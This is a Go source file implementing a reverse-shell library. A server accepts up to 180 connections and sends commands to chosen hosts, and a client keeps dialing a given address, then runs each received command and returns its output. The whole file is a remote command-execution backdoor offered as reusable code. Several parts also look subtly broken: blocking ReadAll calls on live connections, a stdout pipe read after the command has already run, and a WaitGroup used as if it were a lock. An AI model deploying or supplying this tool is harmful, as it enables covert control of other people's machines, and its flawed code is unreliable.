package shell

import (
	"errors"
	"io/ioutil"
	"net"
	"os/exec"
	"strings"
	"sync"
	"time"
)

const MAX_CONNS = 180
const SPACE = " "

var wg sync.WaitGroup

type ShellServer struct {
	Conns []net.Conn
}

type ShellClient struct {
	Conn net.Conn
}

// InitShellServer - (ALL) This returns a pointer to a struct consisting of
// data used for a shell server.
func InitShellServer() *ShellServer {
	sh := &ShellServer{Conns: make([]net.Conn, 0, MAX_CONNS)}
	return sh
}

// listener - (SERVER) This is a thread-safe function that uses
// sync.WaitGroup to be functioning as a separate listening thread
// for listening for new shells to connect to a ShellServer.
func (ss *ShellServer) listener(port string) error {
	wg.Add(1)
	defer wg.Done()

	l, err := net.Listen("tcp", port)
	if err != nil {
		return err
	}
	for {
		if len(ss.Conns) <= MAX_CONNS {
			conn, err := l.Accept()
			if err != nil {
				return err
			}

			ss.Conns = append(ss.Conns, conn)
		} else {
			return nil
		}
		time.Sleep(10000000) // sleep for 10 ms to allow accesses to resources locked by waitgroup
	}
}

// SpawnListenerDaemon - (SERVER) This is just calls a listening daemon
// goroutine. It is also thread-safe
func (ss *ShellServer) SpawnListenerDaemon(port string) {
	wg.Add(1)
	defer wg.Done()

	go ss.listener(port)
}

// GetConnectionCount - (SERVER) This should be used to return the number of
// connected shells. It is also thread-safe.
func (ss *ShellServer) GetConnectionCount() int {
	wg.Add(1)
	defer wg.Done()

	return len(ss.Conns)
}

// GetConnectedIPS - (SERVER) This is used to return a slice of strings
// of the ip addresses of connected shells.
func (ss *ShellServer) GetConnectedIPS() []string {
	wg.Add(1)
	defer wg.Done()

	remoteAddrs := make([]string, 0, MAX_CONNS)

	for _, conn := range ss.Conns {
		remoteAddrs = append(remoteAddrs, conn.RemoteAddr().String())
	}

	return remoteAddrs
}

// SpawnShell - (SERVER) This is a synchronous (blocking) function that
// sends a command to be ran on a specified connected shell. It then waits
// for the response.
func (ss *ShellServer) SpawnShell(dataToSend string, connectionIndex int) (string, error) {
	wg.Add(1)
	defer wg.Done()

	// send the data
	ss.Conns[connectionIndex].Write([]byte(dataToSend))
	dataRecved, err := ioutil.ReadAll(ss.Conns[connectionIndex])
	if err != nil {
		return "", errors.New("unable to spawn shell")
	}
	dataRecvedStr := string(dataRecved[:])
	time.Sleep(10000000) // sleep for 10 ms to allow accesses to resources locked by waitgroup
	return dataRecvedStr, nil
}

// InitShellClient - This is used to initialize a new
// instance of a shell client. It should be called
// first, before doing anything involving the client.
func InitShellClient(hostAddr string) *ShellClient {
	wg.Add(1)
	defer wg.Done()

	sc := new(ShellClient)

	for {
		var err error
		sc.Conn, err = net.Dial("tcp", hostAddr)
		if err == nil {
			break
		}
		time.Sleep(10000000) // sleep for 10 ms to allow accesses to resources locked by waitgroup
	}

	return sc
}

// SpawnShell - (CLIENT) This should be used to create a synchronous
// (blocking) function on the client-side that constantly tries to connect
// to the server. Once it does connect to the server, it listens
// for commands.
func (sc *ShellClient) SpawnShell(hostAddr string) error {
	wg.Add(1)
	defer wg.Done()

	for {
		cmdToRun, err := ioutil.ReadAll(sc.Conn)
		if err != nil {
			return err
		}
		cmdToRunStrs := strings.Split(string(cmdToRun[:]), " ")
		cmd := exec.Command(cmdToRunStrs[0], cmdToRunStrs[1:]...)

		stdoutPipe, err := cmd.StdoutPipe()
		if err != nil {
			return err
		}

		err = cmd.Run()
		if err != nil {
			return err
		}
		buff, err := ioutil.ReadAll(stdoutPipe)
		if err != nil {
			return err
		}
		sc.Conn.Write(buff)
		time.Sleep(10000000) // sleep for 10 ms to allow accesses to resources locked by waitgroup
	}
	return nil
}
